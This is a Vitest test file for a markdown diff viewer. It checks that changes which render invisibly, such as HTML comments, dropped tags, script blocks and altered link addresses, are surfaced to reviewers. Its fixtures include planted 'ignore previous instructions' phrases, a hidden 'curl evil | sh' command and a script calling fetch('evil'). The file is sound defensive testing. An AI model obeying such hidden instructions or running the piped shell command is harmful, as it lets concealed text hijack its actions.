// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { diffHunk } from "../../../main/test-repo";
import type { FileDiff, Hunk } from "../../../shared/types";
import { markdownPage } from "./markdown";
import { changeMarks } from "./preview";
import { fenceRows, markChanges, oldCuts, showHiddenText } from "./redline";
import { cutsAt, mergeEdits, wordRanges } from "./words";

const fileOf = (...hunks: Hunk[]): FileDiff => ({ path: "x.md", status: "modified", binary: false, additions: 0, deletions: 0, hunks });

function pages(oldText: string, newText: string, hunks: Hunk[], inline = true) {
  const file = fileOf(...hunks);
  const a = markdownPage(oldText, null, () => null);
  const b = markdownPage(newText, changeMarks(file), () => null);
  markChanges(a, b, oldText, newText, oldCuts(file), changeMarks(file).added, inline);
  return { a, b };
}

const parsedAgain = (page: HTMLElement) => {
  const box = document.createElement("div");
  box.innerHTML = page.innerHTML;
  return box;
};

describe("whole blocks of prose", () => {
  it("keeps a new heading and a removed paragraph as whole blocks", () => {
    const { b } = pages("one\n\ngone away\n", "one\n\n## brand new\n", [diffHunk(3, ["-gone away", "+## brand new"])]);
    const page = parsedAgain(b);
    expect(page.querySelector("h2.md-whole .md-ins")!.textContent).toBe("brand new");
    expect(page.querySelector("p.md-gone.md-whole .md-del")!.textContent).toBe("gone away");
  });

  it("leaves added code in its line bands", () => {
    const { b } = pages("one\n", "one\n\n```\nx\n```\n", [diffHunk(2, ["+", "+```", "+x", "+```"])]);
    expect(b.querySelector("pre .md-ins")).toBeNull();
  });
});

describe("edits the page can't show", () => {
  const source = (from: string, to: string, hunk: Hunk) => pages(from, to, [hunk]).b.querySelector(".md-source")?.textContent;

  it.each([
    ["an inline footnote beside an edited word", "alpha beta^[limit 10]\n", "alpha gamma^[limit 1000]\n", "limit 1000"],
    ["a comment beside an edited word", "alpha <!-- old --> beta\n", "alpha <!-- new --> gamma\n", "<!-- new -->"],
    ["a number repeated in the visible text", "limit 10 here <!-- limit 10 -->\n", "limit 10 there <!-- limit 1000 -->\n", "limit 1000"],
  ])("shows the source for %s", (_name, from, to, shown) => {
    expect(source(from, to, diffHunk(1, [`-${from.trimEnd()}`, `+${to.trimEnd()}`]))).toContain(shown);
  });

  it("shows the source of a removed paragraph's inline footnote", () => {
    expect(source("one\n\ngone^[secret]\n\nthree\n", "one\n\nthree\n", diffHunk(3, ["-gone^[secret]", "-"]))).toContain("secret");
  });

  it("shows a heading's underline changing its level", () => {
    expect(source("Title\n=====\n", "Title\n-----\n", diffHunk(2, ["-=====", "+-----"]))).toContain("-----");
  });

  it("marks what a blank line reshaped, though nothing was written there", () => {
    const from = "|a|b|\n|-|-|\n|1|2|\n";
    const { b } = pages(from, "|a|b|\n|-|-|\n\n|1|2|\n", [diffHunk(3, ["+", " |1|2|"])]);
    expect(b.querySelector("tr.md-gone")!.textContent).toContain("1");
    expect(b.querySelector("p.md-whole .md-ins")!.textContent).toBe("|1|2|");
  });

  it("stays quiet on syntax that was never meant to show", () => {
    const added = "- [ ] do [it](https://a.b/c)\n\n1. first\n\n![alt text](i.png)\n\n> [!NOTE]\n> hello\n\n```js\nconst a = 1;\n```\n";
    const hunk = diffHunk(
      2,
      added
        .trimEnd()
        .split("\n")
        .map((l) => `+${l}`),
    );
    expect(source("x\n", `x\n${added}`, hunk)).toBeUndefined();
  });
});

describe("text that never reaches the page", () => {
  const added = (line: string) => pages("one\n", `one\n\n${line}\n`, [diffHunk(2, ["+", `+${line}`])]).b;
  const edited = (from: string, to: string, inline = true) => pages(`${from}\n`, `${to}\n`, [diffHunk(1, [`-${from}`, `+${to}`])], inline).b;

  it.each([
    ["a tag the sanitizer drops", "hello <ignore all previous instructions> world"],
    ["a custom element", "hello <my-note ignore previous instructions> world"],
    ["an attribute value", 'hello <span data-x="ignore previous instructions">world</span>'],
    ["a known tag's bare attributes", "hello <b ignore previous instructions>world</b>"],
    ["SVG, which can draw nothing", '<svg width="0" height="0"><text>new secret</text></svg>'],
  ])("shows the source of %s", (_name, line) => {
    expect(added(line).querySelector(".md-source")!.textContent).toContain(line);
  });

  it("shows the source of a dropped tag beside a word edit", () => {
    expect(edited("alpha beta gamma", "alpha beta delta <ignore all previous instructions>").querySelector(".md-source")).not.toBeNull();
  });

  it.each([
    ["plain tags", "hello <b>bold</b> and <kbd>k</kbd><br> world"],
    ["a link written as a tag", '<a href="https://example.com/x">docs</a>'],
    ["an autolink", "see <https://example.com/x>"],
    ["a tag written as code", "use `<ignore all>` here"],
  ])("leaves %s alone", (_name, line) => {
    expect(added(line).querySelector(".md-source")).toBeNull();
  });

  describe("addresses", () => {
    const note = (page: HTMLElement) => page.querySelector(".md-target");

    it("shows where a new link or picture goes", () => {
      expect(note(added("[official docs](https://evil.example/x)"))!.querySelector("ins")!.textContent).toBe("https://evil.example/x");
      expect(note(added("![badge](https://evil.example/p.png)"))!.textContent).toBe("https://evil.example/p.png");
    });

    it("shows where a removed link went, in both views", () => {
      const text = "one\n\n[docs](https://gone.example/x)\n";
      for (const inline of [true, false]) {
        const { a, b } = pages(text, "one\n", [diffHunk(2, ["-", "-[docs](https://gone.example/x)"])], inline);
        expect(note(inline ? b : a)!.querySelector("del")!.textContent).toBe("https://gone.example/x");
      }
    });

    it("says nothing when the words are the address, or it stays on the page", () => {
      expect(note(added("https://example.com/x"))).toBeNull();
      expect(note(added("[below](#rollback)"))).toBeNull();
    });
  });

  describe("formatting beside a word edit", () => {
    const note = (from: string, to: string) => edited(from, to).querySelector(".md-target")?.textContent;

    it("is noted when a kept word changes its emphasis", () => {
      expect(note("do ~~not~~ run x", "do not run y")).toBe("Formatting changed");
      expect(note("do not run x", "do **not** run y")).toBe("Formatting changed");
    });

    it("isn't noted for a word that only came or went with its emphasis", () => {
      expect(note("run x", "run **y**")).toBeUndefined();
      expect(note("run **now** x", "run x and more")).toBeUndefined();
    });
  });
});

describe("markChanges through the page's HTML", () => {
  const edit = (from: string, to: string, line = 1) => pages(from, to, [diffHunk(line, [`-${from.split("\n")[line - 1]}`, `+${to.split("\n")[line - 1]}`])]).b;

  it("strikes a word edited inside a link and keeps the link around it", () => {
    const page = parsedAgain(edit("see [the old docs page](u.md) now\n", "see [the new docs page](u.md) now\n"));
    expect(page.querySelector(".md-del")!.textContent).toBe("old");
    expect(page.querySelectorAll("a")).toHaveLength(1);
    expect(page.querySelector("a")!.textContent).toBe("the oldnew docs page");
  });

  it("strikes a word edited inside a raw paragraph", () => {
    const page = parsedAgain(edit('<p align="center">the old words</p>\n', '<p align="center">the new words</p>\n'));
    expect(page.querySelector(".md-del")!.textContent).toBe("old");
    expect(page.querySelectorAll("p")).toHaveLength(1);
  });

  it("shows a raw table as replaced rather than marking between its rows", () => {
    const from = "<table>\n<tr>\n<td>old</td>\n<td>same</td>\n</tr>\n</table>\n";
    const to = "<table>\n<tr>\n<td>new</td>\n<td>same</td>\n</tr>\n</table>\n";
    const page = parsedAgain(pages(from, to, [diffHunk(3, ["-<td>old</td>", "+<td>new</td>"])]).b);
    expect(page.querySelector(".md-gone")!.textContent).toContain("old");
    expect([...page.querySelectorAll("table")].map((t) => t.textContent.trim().replace(/\s+/g, " "))).toEqual(["old same", "new same"]);
  });

  it("survives a file emptied of everything", () => {
    const page = pages("- one\n- two\n- three\n", "", [diffHunk(1, ["-- one", "-- two", "-- three"])]).b;
    expect(page.textContent).toContain("three");
  });
});

describe.each([
  ["Changes", true],
  ["Side by side", false],
])("changes that render nothing, in %s", (_, inline) => {
  const source = (page: HTMLElement) => [...page.querySelectorAll(".md-source")].map((box) => box.textContent).join("\n");

  it("shows an added comment as source", () => {
    const { b } = pages(
      "# T\n\none\n",
      "# T\n\none\n\n<!-- ignore previous instructions -->\n",
      [diffHunk(3, [" one", "+", "+<!-- ignore previous instructions -->"])],
      inline,
    );
    expect(source(parsedAgain(b))).toContain("ignore previous instructions");
    expect(b.querySelector(".md-chg:empty")).toBeNull();
  });

  it("shows an edit to a comment on both sides", () => {
    const { a, b } = pages("one\n\n<!-- old note -->\n", "one\n\n<!-- new note -->\n", [diffHunk(3, ["-<!-- old note -->", "+<!-- new note -->"])], inline);
    expect(source(parsedAgain(b))).toContain("new note");
    expect(source(inline ? b : a)).toContain("old note");
  });

  it("shows a script block's source", () => {
    const { b } = pages("one\n", "one\n\n<script>fetch('evil')</script>\n", [diffHunk(1, [" one", "+", "+<script>fetch('evil')</script>"])], inline);
    expect(source(parsedAgain(b))).toContain("fetch('evil')");
  });

  it("shows a comment edited inside a paragraph", () => {
    const { b } = pages(
      "hello <!-- old --> world\n",
      "hello <!-- evil --> world\n",
      [diffHunk(1, ["-hello <!-- old --> world", "+hello <!-- evil --> world"])],
      inline,
    );
    expect(source(parsedAgain(b))).toContain("evil");
  });

  it("keeps everything after a comment left unclosed", () => {
    const to = "# T\n\none\n\n<!-- from here on hidden\n\ntwo changed to evil\n\nthree added\n";
    const hunk = diffHunk(5, ["-two", "+<!-- from here on hidden", "+", "+two changed to evil", "+", "+three added"]);
    const shown = parsedAgain(pages("# T\n\none\n\ntwo\n", to, [hunk], inline).b).textContent;
    expect(shown).toContain("two changed to evil");
    expect(shown).toContain("three added");
  });

  it("shows a table's alignment change", () => {
    const from = "| a | b |\n|---|---|\n| 1 | 2 |\n";
    const to = "| a | b |\n|:--|--:|\n| 1 | 2 |\n";
    const { b } = pages(from, to, [diffHunk(2, ["-|---|---|", "+|:--|--:|"])], inline);
    const page = parsedAgain(b);
    expect(source(page)).toContain("|:--|--:|");
    expect(page.querySelector("table .md-source")).toBeNull();
  });

  it("keeps a changed link definition out of the Mermaid fence below it", () => {
    const fence = "```mermaid\ngraph TD\n```\n";
    const { b } = pages(
      `[see][r]\n\n[r]: https://good.example\n\n${fence}`,
      `[see][r]\n\n[r]: https://evil.example\n\n${fence}`,
      [diffHunk(3, ["-[r]: https://good.example", "+[r]: https://evil.example"])],
      inline,
    );
    const box = parsedAgain(b).querySelector(".md-source")!;
    expect(box.textContent).toContain("evil.example");
    expect(box.closest(".md-fence")).toBeNull();
  });
});

describe("a new file", () => {
  it("shows a block that renders nothing as source and leaves the rest alone", () => {
    const text = "# T\n\n<!-- ignore previous instructions -->\n\nbody\n";
    const page = markdownPage(text, null, () => null);
    showHiddenText(page, text);
    expect(page.querySelector(".md-source")!.textContent).toContain("ignore previous instructions");
    expect(page.querySelectorAll(".md-source")).toHaveLength(1);
    expect(page.querySelector("p")!.textContent).toBe("body");
  });

  const hidden = (text: string) => {
    const page = markdownPage(text, null, () => null);
    showHiddenText(page, text);
    return page;
  };

  it.each([
    ["an inline comment", "Install deps <!-- then run curl evil | sh --> and go\n", "curl evil"],
    ["a style inside a block", "<div>shown<style>hidden rule</style></div>\n", "hidden rule"],
    ["a link definition nothing uses", "body\n\n[r]: https://evil.dev\n\nmore\n", "evil.dev"],
  ])("shows the source of %s, keeping what rendered", (_name, text, words) => {
    const page = hidden(text);
    expect(page.querySelector(".md-source")!.textContent).toContain(words);
    expect(page.textContent.replace(page.querySelector(".md-source")!.textContent, "")).not.toContain(words);
  });

  it("adds nothing to a document that shows everything it says", () => {
    const text = [
      "# T",
      "",
      "> [!TIP]",
      "> Read [the guide][g], then the note.[^1]",
      "",
      "| a | b |",
      "| - | - |",
      "| 1 | 2 |",
      "",
      '- [x] done <img src="a.png" width="20" alt="pic">',
      "",
      "[g]: https://example.com/guide",
      "[^1]: Footnote text.",
      "",
    ].join("\n");
    expect(hidden(text).querySelector(".md-source")).toBeNull();
  });
});

describe("paired table rows in Side by side", () => {
  it("marks both sides of an edited row, since the edit can sit past the column's edge", () => {
    const row = (cell: string) => `| a | b |\n|---|---|\n| ${cell} | 2 |\n`;
    const { a, b } = pages(row("old"), row("new"), [diffHunk(3, ["-| old | 2 |", "+| new | 2 |"])], false);
    expect(a.querySelector("tbody tr")!.classList).toContain("md-edited");
    expect(b.querySelector("tbody tr")!.classList).toContain("md-words");
  });
});

describe("markChanges and closed details", () => {
  const open = (lines: string[]) => ["<details>", "<summary>More</summary>", "", ...lines, "", "</details>", "", "after", ""].join("\n");
  const allOpen = (root: HTMLElement) => [...root.querySelectorAll("details")].every((d) => d.open);

  it("opens a section whose last paragraph was removed", () => {
    const { b } = pages(open(["Kept.", "", "Removed."]), open(["Kept."]), [diffHunk(5, ["-", "-Removed."])]);
    expect(b.querySelector("details .md-gone")!.textContent).toBe("Removed.");
    expect(allOpen(b)).toBe(true);
  });

  it("opens both columns of Side by side around an edited word", () => {
    const { a, b } = pages(open(["the old word"]), open(["the new word"]), [diffHunk(4, ["-the old word", "+the new word"])], false);
    expect(allOpen(a)).toBe(true);
    expect(allOpen(b)).toBe(true);
  });

  it("opens a section written as a single HTML block", () => {
    const from = "<details><summary>More</summary>the old word</details>\n";
    const to = "<details><summary>More</summary>the new word</details>\n";
    const page = parsedAgain(pages(from, to, [diffHunk(1, [`-${from.trim()}`, `+${to.trim()}`])]).b);
    expect(allOpen(page)).toBe(true);
    expect(page.querySelector(".md-gone")!.textContent).toContain("old");
  });
});

describe("files built to be slow", () => {
  const LIMIT_MS = 5000;
  const TEST_MS = 20_000;
  const marking = (oldText: string, newText: string, hunks: Hunk[]) => {
    const file = fileOf(...hunks);
    const a = markdownPage(oldText, null, () => null);
    const b = markdownPage(newText, changeMarks(file), () => null);
    const start = performance.now();
    markChanges(a, b, oldText, newText, oldCuts(file), changeMarks(file).added, true);
    return { ms: performance.now() - start, b };
  };

  it.each([
    ["tags that never close", "<a ".repeat(83_000)],
    ["footnotes that never close", "[^a".repeat(83_000)],
  ])(
    "gets through a paragraph of %s",
    (_name, line) => {
      expect(marking("one\n", `one\n\n${line}\n`, [diffHunk(2, ["+", `+${line}`])]).ms).toBeLessThan(LIMIT_MS);
    },
    TEST_MS,
  );

  it(
    "gets through thousands of changed links, naming each address once",
    () => {
      const [from, to] = ["[a](b) ".repeat(12_000), "[a](c) ".repeat(12_000)];
      const { ms, b } = marking(`${from}\n`, `${to}\n`, [diffHunk(1, [`-${from}`, `+${to}`])]);
      expect(ms).toBeLessThan(LIMIT_MS);
      expect(b.querySelector(".md-target")!.textContent).toBe("bc");
    },
    TEST_MS,
  );
});

describe("big changes", () => {
  it("shows a rewritten code block as removed and added instead of diffing it", () => {
    const lines = (seed: string) => Array.from({ length: 4000 }, (_, i) => `${seed} ${i}`);
    const rows = fenceRows(lines("old"), lines("new"));
    expect(rows.slice(0, 1)).toEqual([{ kind: "del", text: "old 0" }]);
    expect(rows.at(-1)).toEqual({ kind: "add", text: "new 3999" });
    expect(rows).toHaveLength(8000);
  });
});

describe("cutsAt", () => {
  it("finds where each deletion lands in the new text", () => {
    expect(
      cutsAt(
        [
          [2, 3],
          [6, 7],
        ],
        [[2, 4]],
      ),
    ).toEqual([
      { at: 2, cut: [2, 3] },
      { at: 7, cut: [6, 7] },
    ]);
  });
});

describe("mergeEdits", () => {
  it("leaves a few separate edits alone", () => {
    const found = wordRanges("write a test now", "write the test today")!;
    expect(mergeEdits("write a test now", found)).toEqual(found);
  });

  it("marks a heavy rewrite as phrases, not around each shared word", () => {
    const a = "one shared two words three here four again five there six more seven text";
    const b = "red shared blue words green here pink again gold there teal more navy text";
    const [cut, put] = mergeEdits(a, wordRanges(a, b)!);
    expect(cut).toEqual([[0, a.length - 5]]);
    expect(put).toEqual([[0, b.length - 5]]);
  });

  it("keeps a long shared stretch between phrases", () => {
    const shared = "this whole middle part of the sentence stays exactly as it was";
    const a = `one shared two words three here four ${shared} five there six more seven text`;
    const b = `red shared blue words green here pink ${shared} gold there teal more navy text`;
    const [cut] = mergeEdits(a, wordRanges(a, b)!);
    expect(cut).toHaveLength(2);
  });
});

describe("markChanges inline", () => {
  it("shows the old word beside the new one, keeping the block's formatting", () => {
    const { b } = pages("write a **test** now\n", "write the **test** today\n", [diffHunk(1, ["-write a **test** now", "+write the **test** today"])]);
    const p = b.querySelector("p")!;
    expect(p.classList.contains("md-words")).toBe(true);
    expect(p.querySelector(".md-del")!.textContent).toBe("a");
    expect(p.querySelector(".md-ins")!.textContent).toBe("the");
    expect(p.querySelector("strong")!.textContent).toBe("test");
    expect([...p.querySelectorAll(".md-del")].at(-1)!.textContent).toBe("now");
    expect([...p.querySelectorAll(".md-ins")].at(-1)!.textContent).toBe("today");
  });

  it("keeps inline code inside deleted text", () => {
    const { b } = pages("run `old` first\n", "run `new` first\n", [diffHunk(1, ["-run `old` first", "+run `new` first"])]);
    expect(b.querySelector(".md-del code")?.textContent).toBe("old");
  });

  it("puts a removed list item back in its list", () => {
    const { b } = pages("- one\n- two\n- three\n", "- one\n- three\n", [diffHunk(1, [" - one", "-- two", " - three"])]);
    expect([...b.querySelectorAll("ul")]).toHaveLength(1);
    const items = [...b.querySelectorAll("li")];
    expect(items.map((li) => li.textContent.trim())).toEqual(["one", "two", "three"]);
    expect(items[1].querySelector(".md-gone")).not.toBeNull();
  });

  it("puts a removed table row back in its table", () => {
    const oldText = "| a | b |\n| - | - |\n| 1 | 2 |\n| 3 | 4 |\n";
    const newText = "| a | b |\n| - | - |\n| 1 | 2 |\n";
    const { b } = pages(oldText, newText, [diffHunk(1, [" | a | b |", " | - | - |", " | 1 | 2 |", "-| 3 | 4 |"])]);
    expect(b.querySelectorAll("table")).toHaveLength(1);
    expect(b.querySelectorAll("tr")).toHaveLength(3);
    expect(b.querySelector("tr.md-gone")!.textContent).toContain("3");
  });

  it("removes a whole list as one block, between its neighbours", () => {
    const { b } = pages("before\n\n- x\n- y\n\nafter\n", "before\n\nafter\n", [diffHunk(1, [" before", " ", "-- x", "-- y", "-", " after"])]);
    expect([...b.children].map((el) => el.tagName)).toEqual(["P", "UL", "P"]);
    expect(b.querySelectorAll("ul .md-gone")).toHaveLength(2);
  });

  it("puts a removed first block at the top", () => {
    const { b } = pages("gone\n\nkept\n", "kept\n", [diffHunk(1, ["-gone", "-", " kept"])]);
    expect([...b.querySelectorAll("p")].map((p) => p.textContent)).toEqual(["gone", "kept"]);
  });

  it("shows a rewrite as removed then added when it can't line up the words", () => {
    const { b } = pages("the quick brown fox jumps\n", "a very different sentence entirely\n", [
      diffHunk(1, ["-the quick brown fox jumps", "+a very different sentence entirely"]),
    ]);
    const [gone, added] = b.querySelectorAll("p");
    expect(gone.classList.contains("md-gone")).toBe(true);
    expect(added.classList.contains("md-chg")).toBe(true);
    expect(added.classList.contains("md-words")).toBe(false);
  });

  it("names what changed under words that read the same", () => {
    const { b } = pages("[docs](https://good.dev) here\n", "[docs](https://evil.dev) here\n", [
      diffHunk(1, ["-[docs](https://good.dev) here", "+[docs](https://evil.dev) here"]),
    ]);
    expect(b.querySelector("p.md-chg .md-target .md-del")!.textContent).toBe("https://good.dev");
    expect(b.querySelector("p.md-chg .md-target .md-ins")!.textContent).toBe("https://evil.dev");
    const ticked = pages("- [ ] deploy\n", "- [x] deploy\n", [diffHunk(1, ["-- [ ] deploy", "+- [x] deploy"])]).b;
    expect(ticked.querySelector(".md-target .md-ins")!.textContent).toBe("ticked");
    const plain = pages("is **not** ok\n", "is not ok\n", [diffHunk(1, ["-is **not** ok", "+is not ok"])]).b;
    expect(plain.querySelector(".md-target")!.textContent).toBe("Formatting changed");
  });

  it("names a link that changed along with its words", () => {
    const { b } = pages("[old words](https://good.dev)\n", "[new words](https://evil.dev)\n", [
      diffHunk(1, ["-[old words](https://good.dev)", "+[new words](https://evil.dev)"]),
    ]);
    expect(b.querySelector(".md-target .md-ins")!.textContent).toBe("https://evil.dev");
  });

  it("redlines text in an HTML block holding several tags", () => {
    const line = (word: string) => `<p align="center">${word} tagline</p>`;
    const page = (word: string) => `<h1 align="center">Moire</h1>\n${line(word)}\n\nNext para\n`;
    const { b } = pages(page("Safe"), page("Evil"), [diffHunk(2, [`-${line("Safe")}`, `+${line("Evil")}`, " ", " Next para"])]);
    expect(b.querySelector(".md-del")!.textContent).toBe("Safe");
    expect(b.querySelector(".md-ins")!.textContent).toBe("Evil");
    expect([...b.querySelectorAll("p")].find((p) => p.textContent === "Next para")!.classList.contains("md-chg")).toBe(false);
  });

  it("shows the source of an edit in HTML that leaves a tag open", () => {
    const page = (word: string) => `<details>\n<summary>${word} summary</summary>\n\nbody\n\n</details>\n\nNext para\n`;
    const { a, b } = pages(page("Old"), page("New"), [diffHunk(2, ["-<summary>Old summary</summary>", "+<summary>New summary</summary>", " ", " body"])]);
    expect([...b.querySelectorAll(".md-source .md-ln")].map((l) => l.className)).toEqual(["md-ln del", "md-ln add"]);
    expect(b.querySelector(".md-source")!.getAttribute("data-hunks")).toBe("0");
    expect(a.querySelector(".md-source")).toBeNull();
    const sides = pages(page("Old"), page("New"), [diffHunk(2, ["-<summary>Old summary</summary>", "+<summary>New summary</summary>", " ", " body"])], false);
    expect(sides.a.querySelector(".md-source .md-ln")!.className).toBe("md-ln del");
    expect(sides.b.querySelector(".md-source .md-ln")!.className).toBe("md-ln add");
  });

  it("keeps every deletion on the page when another edit shares its hunk", () => {
    const { b } = pages("one two three four five\n\n[ref]: https://old.dev\n\nnext\n", "one two three four six\n\nnext\n", [
      diffHunk(1, ["-one two three four five", "+one two three four six", " ", "-[ref]: https://old.dev", "-", " next"]),
    ]);
    expect(b.querySelector(".md-del")!.textContent).toBe("five");
    expect(b.querySelector(".md-source")!.textContent).toContain("https://old.dev");
    expect(b.querySelector(".md-cut")).toBeNull();
  });

  it("survives a fence longer than a call's argument limit", () => {
    const page = markdownPage(`\`\`\`\n${"x\n".repeat(150_000)}\`\`\`\n`, null, () => null);
    expect(page.querySelectorAll(".md-ln")).toHaveLength(150_000);
  });

  it("drops the removal tick once the removed text is on the page", () => {
    const { b } = pages("a\n\ngone\n\nb\n", "a\n\nb\n", [diffHunk(1, [" a", " ", "-gone", "-", " b"])]);
    expect(b.querySelector(".md-cut")).toBeNull();
    expect(b.querySelector(".md-gone")!.getAttribute("data-hunks")).toBe("0");
    expect(b.querySelector(".md-gone")!.hasAttribute("data-from")).toBe(false);
  });

  it("marks nothing the diff doesn't show, as when whitespace is hidden", () => {
    const { b } = pages("one  two\n\ngone\n", "one two\n", []);
    expect(b.querySelector(".md-ins, .md-del, .md-gone, .md-chg")).toBeNull();
  });

  it("strikes a wrapper's own text along with the blocks inside it", () => {
    const { b } = pages("keep\n\n<details><summary>Title</summary>\n\nbody\n\n</details>\n\nend\n", "keep\n\nend\n", [
      diffHunk(1, [" keep", " ", "-<details><summary>Title</summary>", "-", "-body", "-", "-</details>", "-", " end"]),
    ]);
    expect(b.querySelector("details.md-gone summary")?.textContent).toBe("Title");
  });

  it("shows text an edit pushed off the page even though no line with it was deleted", () => {
    const oldText = "one\n\n```\ncode\n```\n\nswallowed words here\n";
    const newText = "one\n\n```\ncode\n\nswallowed words here\n";
    const { b } = pages(oldText, newText, [diffHunk(3, [" ```", " code", "-```", " ", " swallowed words here"])]);
    expect(b.textContent).toContain("swallowed words here");
    expect(b.querySelector(".md-chg, .md-gone")).not.toBeNull();
  });

  it("merges a changed fence into line rows with word marks", () => {
    const oldText = "```ts\nconst a = 1;\nkeep();\n```\n";
    const newText = "```ts\nconst a = 2;\nkeep();\n```\n";
    const { b } = pages(oldText, newText, [diffHunk(2, ["-const a = 1;", "+const a = 2;", " keep();"])]);
    expect([...b.querySelectorAll(".md-ln")].map((l) => l.className)).toEqual(["md-ln del", "md-ln add", "md-ln"]);
    expect(b.querySelector(".md-ln.del mark")!.textContent).toBe("1");
    expect(b.querySelector(".md-ln.add mark")!.textContent).toBe("2");
  });

  it("won't let the file forge a mark", () => {
    const text = '<del class="md-del">fake</del> <span data-hunks="0" data-pair="1">x</span> text\n';
    const { b } = pages(text, text, []);
    expect(b.querySelector(".md-del")).toBeNull();
    expect(b.querySelector("[data-pair='1']")).toBeNull();
  });
});

describe("markChanges side by side", () => {
  it("marks each side in place and pairs the blocks", () => {
    const { a, b } = pages(
      "one\n\nthe old word\n\ngone\n",
      "one\n\nthe new word\n",
      [diffHunk(1, [" one", " ", "-the old word", "-", "-gone", "+the new word"])],
      false,
    );
    expect(a.querySelector(".md-del")!.textContent).toBe("old");
    expect(b.querySelector(".md-ins")!.textContent).toBe("new");
    expect(b.querySelector(".md-del")).toBeNull();
    expect(a.querySelector(".md-gone")!.textContent).toBe("gone");
    expect(a.querySelector(".md-gone")!.hasAttribute("data-pair")).toBe(false);
    expect([...a.querySelectorAll("[data-pair]")].map((el) => el.getAttribute("data-pair"))).toEqual(
      [...b.querySelectorAll("[data-pair]")].map((el) => el.getAttribute("data-pair")),
    );
  });
});

describe("wordRanges", () => {
  it("keeps a number whole, with its decimals and percent sign", () => {
    expect(wordRanges("over 2.1% for", "over 0.4% for")).toEqual([[[5, 9]], [[5, 9]]]);
  });
});

describe("fenceRows", () => {
  it("pairs edited lines for word marks and leaves pure additions alone", () => {
    const rows = fenceRows(["a = 1", "b"], ["a = 2", "b", "c"]);
    expect(rows.map((r) => [r.kind, r.text])).toEqual([
      ["del", "a = 1"],
      ["add", "a = 2"],
      ["", "b"],
      ["add", "c"],
    ]);
    expect(rows[0].words).toEqual([[4, 5]]);
    expect(rows[1].words).toEqual([[4, 5]]);
    expect(rows[3].words).toBeUndefined();
  });
});
